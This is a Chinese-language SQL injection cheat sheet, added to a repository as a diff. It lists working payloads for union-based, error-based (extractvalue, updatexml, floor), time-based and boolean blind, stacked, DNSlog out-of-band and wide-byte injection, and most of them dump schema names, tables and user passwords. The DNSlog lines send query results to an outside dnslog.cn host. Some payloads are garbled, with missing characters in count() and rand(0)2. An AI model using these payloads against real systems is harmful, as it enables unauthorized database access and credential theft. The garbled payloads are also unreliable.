@@ -1,0 +1,98 @@
+普通注入
+
+数字型
+（1）加单引号，页面出错
+（2）加 and 1=1， 语句执行正常
+ (3) 加 and 1=2，无法查询出结果，返回数据与原始网页有差异
+
+字符型
+（1）加单引号 select * from table where name='admin''会报错
+ (2) 加 ' and 1=1 无法进行注入，需要通过注释符号绕过
+ (3) 加 and 1=2-- select * from table from where name='admin' and 1=2--' 则会报错
+ 判断列数
+ ?id=1' order by 4#
+ 爆出数据库
+ ?id=-1' union select 1,database(),3--+
+ ?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata#
+ 爆出数据表
+ ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='数据库'#
+ 爆出字段
+ ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='数据表’#
+ 爆出数据值
+ ?id=-1' union select 1,group_concat(0x7e,字段,0x7e),3 from 数据库名.数据表名--+
+ 
+ 报错注入
+ extractvalue函数
+ ?id=1' and extractvalue(1, concat(0x7e,(select @@version),0x7e))--+（爆出版本号）
+ ?id=1' and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))--+(爆出操作系统）
+ ?id=1' and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))--+（爆数据库）
+ ?id=1' and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e))--+(报数据表）
+ ?id=1' and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 3,1),0x7e))--+（爆字段）
+ ?id=1' and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))--+ （爆数据）
+ 
+ updataxml函数
+ 细节问题：extractvalue()基本一样，改个关键字updatexml即可,与extractvalue有个很大的区别实在末尾注入加上，如(1，concat(select @@version),1),而extractvalue函数末尾不加1（数值）
+ ?id=1' and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1)--+ （爆数据库）
+ ?id=1' and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+ （爆数据表）
+ ?id=1' and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 3,1),0x7e),1)--+ （爆字段）
+ ?id=1' and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)--+
+ floor函数
+ ?id=1' union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a--+
+ ?id=1' union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ (爆数据库，不断改变limit得到其他)
+ ?id=1' union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （爆出users表）
+ ?id=1' union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （爆出password字段）
+ ?id=1' union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （爆出数值）
+ 
+ 延时注入
+ 判断注入点：
+ ?id=1' and sleep(5)--+ //正常休眠
+ ?id=1" and sleep(5)--+ //无休眠
+ ?id=1') and sleep(5)--+//无休眠
+ ?id=1") and sleep(5)--+//无休眠
+ ?id=1' and if(length(database())=8,sleep(10),1)--+
+ 爆出数据库：
+ ?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(10))--+
+ 通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s
+ substr(database(),N,1)可以通过改变N的值来判断数据的地几个字符为什么
+ 爆出数据表：
+ ?id=1' and if((select ascii(substr((select table_name from information_schema.tables where table_schema="security"limit 0,1),1,1)))=101,sleep(5),1)-- -
+ 解释：security的第一张表的第一个字符ascii为101，为字符e
+ limit 0,1),N,1还是改变N的的得出第二个字符
+ 再判断字符（ascii判断）
+ ?id=1" and if(ascii(substr(database(),1,1))>115,1,sleep(3))--+
+（left语句判断）
+ ?id=1' and if(left(database(),1)='s',sleep(10),1) --+
+ ?id=1' and if(left(database(),2)='sa',sleep(10),1) --+
+ Substring函数判断
+ type=if(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1='a'),11111,sleep(1))--+
+ 
+ 布尔注入
+ 布尔注入原理
+ 代码存在SQL注入漏洞,然而页面即不会回显数据，也不会回显错误信息，只返回“Right”与“Wrong”,这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的“真”与“假”来识别我们的判断是否正确，这即是布尔盲注
+ left判断
+ ?id=1' and left(database(),1)='s' --+
+ ?id=1' and left(database(),2) > 'sa' --+
+ like语句判断
+ ?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1)like 'e%'--+
+ ascii语句判断
+ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115--+
+ 
+ 堆叠注入
+ ?id=1' order by 3%23
+ ?id=1';show tables%23
+ ?id=-1';show columns from 1919810931114514%23
+ ?id=1'; insert into users(id,username,password) values(88,'aaa','bbb')#
+ 
+ Dnslog对外注入
+ ?id=1' and (select load_file(concat('\\',(select hex(user))),'.682y4b.dnslog.cn/abc')))--+
+ ?id=1' and (select load_file(concat('\\',(select database()),'.682y4b.dnslog.cn/abc')))--+
+ 
+ 宽字节注入
+ 前提
+ 1.使用了addslashes()函数
+ 2.数据库设置了编码模式为GBK
+ 原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞
+ ?id=%df' and 1=1 --+
+ ?id=%df' and 1=2 --+
+ ?id=-1%df' union select 1,2,3 %23
+ 
